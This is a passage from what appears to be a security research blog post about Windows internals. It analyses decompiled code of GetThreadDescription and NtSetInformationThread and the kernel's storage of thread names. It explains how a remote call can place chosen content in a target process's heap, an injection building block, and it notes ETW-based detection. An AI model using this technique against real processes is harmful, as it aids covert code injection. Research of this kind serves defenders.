class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  *ppszThreadDescription = </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-m0">LODWORD</span><span class="enlighter-g1">(</span><span class="enlighter-text">struct_len</span><span class="enlighter-g1">)</span><span class="enlighter-text"> = 144;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-m0">RtlFreeHeap</span><span class="enlighter-g1">(</span><span class="enlighter-m0">NtCurrentPeb</span><span class="enlighter-g1">()</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ProcessHeap, 0, 0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> struct_size = 146; ; struct_size = struct_len + 2 </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    struct_buf = </span><span class="enlighter-g1">(</span><span class="enlighter-k8">const</span><span class="enlighter-text"> UNICODE_STRING *</span><span class="enlighter-g1">)</span><span class="enlighter-m0">RtlAllocateHeap</span><span class="enlighter-g1">(</span><span class="enlighter-m0">NtCurrentPeb</span><span class="enlighter-g1">()</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ProcessHeap, 0, struct_size</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> !struct_buf </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      status = </span><span class="enlighter-n2">0xC0000017</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">goto</span><span class="enlighter-text"> finish;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    res = </span><span class="enlighter-m0">NtQueryInformationThread</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            hThread,</span></div></div><div class=""><div><span class="enlighter-text">            ThreadNameInformation,</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">(</span><span class="enlighter-text">PVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">struct_buf,</span></div></div><div class=""><div><span class="enlighter-text">            struct_len,</span></div></div><div class=""><div><span class="enlighter-text">            &amp;ReturnLength</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    status = res;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> res != </span><span class="enlighter-n2">0xC0000004</span><span class="enlighter-text"> &amp;&amp; res != </span><span class="enlighter-n2">0xC0000023</span><span class="enlighter-text"> &amp;&amp; res != </span><span class="enlighter-n2">0x80000005</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">break</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    struct_len = ReturnLength;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">RtlFreeHeap</span><span class="enlighter-g1">(</span><span class="enlighter-m0">NtCurrentPeb</span><span class="enlighter-g1">()</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ProcessHeap, 0, </span><span class="enlighter-g1">(</span><span class="enlighter-text">PVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">struct_buf</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> res </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">= 0 </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ReturnLength = struct_buf-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Length;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// move the buffer to the beginning of the structure</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memmove_0</span><span class="enlighter-g1">((</span><span class="enlighter-k5">void</span><span class="enlighter-text"> *</span><span class="enlighter-g1">)</span><span class="enlighter-text">struct_buf, struct_buf-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Buffer, ReturnLength</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// null terminate the buffer</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;struct_buf-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Length + </span><span class="enlighter-g1">((</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> __int64</span><span class="enlighter-g1">)</span><span class="enlighter-text">ReturnLength </span><span class="enlighter-g1">&gt;&gt;</span><span class="enlighter-text"> 1</span><span class="enlighter-g1">))</span><span class="enlighter-text"> = 0;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// fill in the passed pointer</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    *ppszThreadDescription = &amp;struct_buf-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Length;</span></div></div><div class=""><div><span class="enlighter-text">    struct_buf = 0i64;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">finish:</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-m0">RtlFreeHeap</span><span class="enlighter-g1">(</span><span class="enlighter-m0">NtCurrentPeb</span><span class="enlighter-g1">()</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ProcessHeap, 0, </span><span class="enlighter-g1">(</span><span class="enlighter-text">PVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">struct_buf</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k0">return</span><span class="enlighter-text"> status | </span><span class="enlighter-n2">0x10000000</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">HRESULT __stdcall GetThreadDescription(HANDLE hThread, PWSTR *ppszThreadDescription)
{
  SIZE_T struct_len; // rbx
  SIZE_T struct_size; // r8
  NTSTATUS res; // eax
  NTSTATUS status; // ebx
  const UNICODE_STRING *struct_buf; // rdi
  ULONG ReturnLength; // [rsp+58h] [rbp+10h] BYREF

  *ppszThreadDescription = nullptr;
  LODWORD(struct_len) = 144;
  RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, 0);
  for ( struct_size = 146; ; struct_size = struct_len + 2 )
  {
    struct_buf = (const UNICODE_STRING *)RtlAllocateHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, struct_size);
    if ( !struct_buf )
    {
      status = 0xC0000017;
      goto finish;
    }
    res = NtQueryInformationThread(
            hThread,
            ThreadNameInformation,
            (PVOID)struct_buf,
            struct_len,
            &amp;ReturnLength);
    status = res;
    if ( res != 0xC0000004 &amp;&amp; res != 0xC0000023 &amp;&amp; res != 0x80000005 )
      break;
    struct_len = ReturnLength;
    RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, (PVOID)struct_buf);
  }
  if ( res &gt;= 0 )
  {
    ReturnLength = struct_buf-&gt;Length;
    // move the buffer to the beginning of the structure
    memmove_0((void *)struct_buf, struct_buf-&gt;Buffer, ReturnLength);
    // null terminate the buffer
    *(&amp;struct_buf-&gt;Length + ((unsigned __int64)ReturnLength &gt;&gt; 1)) = 0;
    // fill in the passed pointer
    *ppszThreadDescription = &amp;struct_buf-&gt;Length;
    struct_buf = 0i64;
  }
finish:
  RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, (PVOID)struct_buf);
  return status | 0x10000000;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HRESULT __stdcall GetThreadDescription(HANDLE hThread, PWSTR *ppszThreadDescription)
{
  SIZE_T struct_len; // rbx
  SIZE_T struct_size; // r8
  NTSTATUS res; // eax
  NTSTATUS status; // ebx
  const UNICODE_STRING *struct_buf; // rdi
  ULONG ReturnLength; // [rsp+58h] [rbp+10h] BYREF

  *ppszThreadDescription = nullptr;
  LODWORD(struct_len) = 144;
  RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, 0);
  for ( struct_size = 146; ; struct_size = struct_len + 2 )
  {
    struct_buf = (const UNICODE_STRING *)RtlAllocateHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, struct_size);
    if ( !struct_buf )
    {
      status = 0xC0000017;
      goto finish;
    }
    res = NtQueryInformationThread(
            hThread,
            ThreadNameInformation,
            (PVOID)struct_buf,
            struct_len,
            &amp;ReturnLength);
    status = res;
    if ( res != 0xC0000004 &amp;&amp; res != 0xC0000023 &amp;&amp; res != 0x80000005 )
      break;
    struct_len = ReturnLength;
    RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, (PVOID)struct_buf);
  }
  if ( res &gt;= 0 )
  {
    ReturnLength = struct_buf-&gt;Length;
    // move the buffer to the beginning of the structure
    memmove_0((void *)struct_buf, struct_buf-&gt;Buffer, ReturnLength);
    // null terminate the buffer
    *(&amp;struct_buf-&gt;Length + ((unsigned __int64)ReturnLength &gt;&gt; 1)) = 0;
    // fill in the passed pointer
    *ppszThreadDescription = &amp;struct_buf-&gt;Length;
    struct_buf = 0i64;
  }
finish:
  RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, (PVOID)struct_buf);
  return status | 0x10000000;
}</pre>



<p class="wp-block-paragraph">Analyzing this function reveals some other interesting implementation details. The buffer for the thread name that we want to retrieve is allocated on a heap within the retrieving process. The function automatically allocates a size that can fit the relevant&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string">UNICODE_STRING</a>. It then erases the initial fields of the structure (<code>Length</code>&nbsp;and&nbsp;<code>MaximumLength</code>), and moves the buffer content towards the beginning of the structure, transforming it into a simple, null-terminated wide string. Next, the pointer to this new buffer is filled into the variable passed by the caller.</p>



<p class="wp-block-paragraph">If we call&nbsp;<code>GetThreadDescription</code>&nbsp;remotely, in the context of the target process, we gain a remote allocation of a buffer on the heap, plus, getting it filled with our content.</p>



<h3 class="wp-block-heading" id="location-of-the-structure">Location of the structure</h3>



<p class="wp-block-paragraph">Looking at the implementation, we can notice that a buffer that we retrieve via&nbsp;<code>GetThreadDescription</code>&nbsp;is just a local copy. Now the question is: where is the original&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string">UNICODE_STRING</a>, associated with the thread, stored? To learn more we need to look into the Windows kernel (<code>ntoskrnl.exe</code>), at the implementation of the syscalls that set /read it (&nbsp;<code>NtSetInformationThread</code>&nbsp;and&nbsp;<code>NtQueryInformationThread</code>).</p>



<p class="wp-block-paragraph">It turns out this buffer is stored in the Kernel Mode, represented by the field in&nbsp;<code>ETHREAD</code>&nbsp;→&nbsp;<code>ThreadName</code>.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">   lkd</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> dt nt!_ETHREAD</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   +</span><span class="enlighter-n2">0x610</span><span class="enlighter-text"> ThreadName       </span><span class="enlighter-g0">:</span><span class="enlighter-text"> Ptr64 _UNICODE_STRING</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span></div></div></div><div class="enlighter-raw">   lkd&gt; dt nt!_ETHREAD
   [...]
   +0x610 ThreadName       : Ptr64 _UNICODE_STRING
   [...]</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">   lkd&gt; dt nt!_ETHREAD
   [...]
   +0x610 ThreadName       : Ptr64 _UNICODE_STRING
   [...]</pre>



<p class="wp-block-paragraph">Fragment of&nbsp;<code>NtSetInformationThread</code>&nbsp;responsible for setting the thread name (in Kernel Mode):</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          Length = Src.</span><span class="enlighter-m3">Length</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Src.</span><span class="enlighter-m3">Length</span><span class="enlighter-text"> &amp; 1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> != 0 || Src.</span><span class="enlighter-m3">Length</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Src.</span><span class="enlighter-m3">MaximumLength</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            status = </span><span class="enlighter-n2">0xC000000D</span><span class="enlighter-text">; </span><span class="enlighter-c0">// STATUS_INVALID_PARAMETER -&gt; invalid buffer size supplied</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            PoolWithTag = </span><span class="enlighter-m0">ExAllocatePoolWithTag</span><span class="enlighter-g1">(</span><span class="enlighter-text">NonPagedPoolNx, Src.</span><span class="enlighter-m3">Length</span><span class="enlighter-text"> + 16i64, 'mNhT'</span><span class="enlighter-g1">)</span><span class="enlighter-text">; </span><span class="enlighter-c0">// allocating a buffer on non paged pool, with tag 'ThNm'</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            threadName = PoolWithTag;</span></div></div><div class=""><div><span class="enlighter-text">            v113 = PoolWithTag;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> PoolWithTag </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">              p_Length = &amp;PoolWithTag</span><span class="enlighter-g1">[</span><span class="enlighter-text">1</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">Length</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">              threadName-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Buffer = p_Length;</span></div></div><div class=""><div><span class="enlighter-text">              threadName-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Length = Length;</span></div></div><div class=""><div><span class="enlighter-text">              threadName-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">MaximumLength = Length;</span></div></div><div class=""><div><span class="enlighter-text">              </span><span class="enlighter-m0">memmove</span><span class="enlighter-g1">(</span><span class="enlighter-text">p_Length, Src.</span><span class="enlighter-m3">Buffer</span><span class="enlighter-text">, Length</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">              eThread = Object;</span></div></div><div class=""><div><span class="enlighter-text">              </span><span class="enlighter-m0">PspLockThreadSecurityExclusive</span><span class="enlighter-g1">(</span><span class="enlighter-text">Object, CurrentThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">              v105 = 1;</span></div></div><div class=""><div><span class="enlighter-text">              P = eThread-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ThreadName;</span></div></div><div class=""><div><span class="enlighter-text">              eThread-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ThreadName = threadName;</span></div></div><div class=""><div><span class="enlighter-text">              threadName = 0i64;</span></div></div><div class=""><div><span class="enlighter-text">              v113 = 0i64;</span></div></div><div class=""><div><span class="enlighter-text">              </span><span class="enlighter-m0">EtwTraceThreadSetName</span><span class="enlighter-g1">(</span><span class="enlighter-text">eThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">              </span><span class="enlighter-k1">goto</span><span class="enlighter-text"> finish;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            status = </span><span class="enlighter-n2">0xC000009A</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          status = </span><span class="enlighter-n2">0xC0000004</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        v104 = status;</span></div></div><div class=""><div><span class="enlighter-text">finish:</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span></div></div></div><div class="enlighter-raw">[...]
          Length = Src.Length;
          if ( (Src.Length &amp; 1) != 0 || Src.Length &gt; Src.MaximumLength )
          {
            status = 0xC000000D; // STATUS_INVALID_PARAMETER -&gt; invalid buffer size supplied
          }
          else
          {
            PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, Src.Length + 16i64, 'mNhT'); // allocating a buffer on non paged pool, with tag 'ThNm'
            threadName = PoolWithTag;
            v113 = PoolWithTag;
            if ( PoolWithTag )
            {
              p_Length = &amp;PoolWithTag[1].Length;
              threadName-&gt;Buffer = p_Length;
              threadName-&gt;Length = Length;
              threadName-&gt;MaximumLength = Length;
              memmove(p_Length, Src.Buffer, Length);
              eThread = Object;
              PspLockThreadSecurityExclusive(Object, CurrentThread);
              v105 = 1;
              P = eThread-&gt;ThreadName;
              eThread-&gt;ThreadName = threadName;
              threadName = 0i64;
              v113 = 0i64;
              EtwTraceThreadSetName(eThread);
              goto finish;
            }
            status = 0xC000009A;
          }
        }
        else
        {
          status = 0xC0000004;
        }
        v104 = status;
finish:
[...]</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">[...]
          Length = Src.Length;
          if ( (Src.Length &amp; 1) != 0 || Src.Length &gt; Src.MaximumLength )
          {
            status = 0xC000000D; // STATUS_INVALID_PARAMETER -&gt; invalid buffer size supplied
          }
          else
          {
            PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, Src.Length + 16i64, 'mNhT'); // allocating a buffer on non paged pool, with tag 'ThNm'
            threadName = PoolWithTag;
            v113 = PoolWithTag;
            if ( PoolWithTag )
            {
              p_Length = &amp;PoolWithTag[1].Length;
              threadName-&gt;Buffer = p_Length;
              threadName-&gt;Length = Length;
              threadName-&gt;MaximumLength = Length;
              memmove(p_Length, Src.Buffer, Length);
              eThread = Object;
              PspLockThreadSecurityExclusive(Object, CurrentThread);
              v105 = 1;
              P = eThread-&gt;ThreadName;
              eThread-&gt;ThreadName = threadName;
              threadName = 0i64;
              v113 = 0i64;
              EtwTraceThreadSetName(eThread);
              goto finish;
            }
            status = 0xC000009A;
          }
        }
        else
        {
          status = 0xC0000004;
        }
        v104 = status;
finish:
[...]</pre>



<p class="wp-block-paragraph">As we can see, the buffer is allocated on&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/nx-and-execute-pool-types"><code>NonPagedPoolNx</code></a>&nbsp;(non-executable non-paged pool). The allocated buffer is filled with the&nbsp;<code>UNICODE_STRING</code>, and its pointer is stored in&nbsp;<code>ThreadName</code> within the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess"><code>ETHREAD</code></a>&nbsp;structure of a particular thread.</p>



<p class="wp-block-paragraph">The event of setting the&nbsp;<code>ThreadName</code>&nbsp;is registered by&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-"><strong>ETW (Event Tracing for Windows)</strong></a>, which can be further used to detect this injection method. The generated event collects data such as ProcessID and ThreadID, which are required to identify the thread and the ThreadName that was set.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">__int64 __fastcall </span><span class="enlighter-m0">EtwTraceThreadSetName</span><span class="enlighter-g1">(</span><span class="enlighter-text">_ETHREAD *thread</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k5">int</span><span class="enlighter-text"> v1; </span><span class="enlighter-c0">// r10d</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  _UNICODE_STRING *ThreadName; </span><span class="enlighter-c0">// rax</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 *Buffer; </span><span class="enlighter-c0">// rcx</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">int</span><span class="enlighter-text"> Length; </span><span class="enlighter-c0">// edx</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> __int64 len; </span><span class="enlighter-c0">// rax</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k5">int</span><span class="enlighter-text"> v7</span><span class="enlighter-g1">[</span><span class="enlighter-text">4</span><span class="enlighter-g1">]</span><span class="enlighter-text">; </span><span class="enlighter-c0">// [rsp+30h] [rbp-50h] BYREF</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 v8</span><span class="enlighter-g1">[</span><span class="enlighter-text">2</span><span class="enlighter-g1">]</span><span class="enlighter-text">; </span><span class="enlighter-c0">// [rsp+40h] [rbp-40h] BYREF</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 *buf; </span><span class="enlighter-c0">// [rsp+50h] [rbp-30h]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 v10; </span><span class="enlighter-c0">// [rsp+58h] [rbp-28h]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 *v11; </span><span class="enlighter-c0">// [rsp+60h] [rbp-20h]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 v12; </span><span class="enlighter-c0">// [rsp+68h] [rbp-18h]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  v7</span><span class="enlighter-g1">[</span><span class="enlighter-text">0</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = thread-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Cid.</span><span class="enlighter-m3">UniqueProcess</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  v1 = 2;</span></div></div><div class=""><div><span class="enlighter-text">  v7</span><span class="enlighter-g1">[</span><span class="enlighter-text">1</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = thread-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Cid.</span><span class="enlighter-m3">UniqueThread</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  v8</span><span class="enlighter-g1">[</span><span class="enlighter-text">0</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = v7;</span></div></div><div class=""><div><span class="enlighter-text">  ThreadName = thread-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ThreadName;</span></div></div><div class=""><div><span class="enlighter-text">  v7</span><span class="enlighter-g1">[</span><span class="enlighter-text">2</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = 0;</span></div></div><div class=""><div><span class="enlighter-text">  v8</span><span class="enlighter-g1">[</span><span class="enlighter-text">1</span><span class="enlighter-g1">]</span><span class="enlighter-text"> = 8i64;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> ThreadName &amp;&amp; </span><span class="enlighter-g1">(</span><span class="enlighter-text">Buffer = ThreadName-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Buffer</span><span class="enlighter-g1">)</span><span class="enlighter-text"> != 0i64 </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    Length = ThreadName-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Length;</span></div></div><div class=""><div><span class="enlighter-text">    len = 0x800i64;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> Length </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> 0x800u </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      len = Length;</span></div></div><div class=""><div><span class="enlighter-text">    buf = Buffer;</span></div></div><div class=""><div><span class="enlighter-text">    v10 = len;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> !len 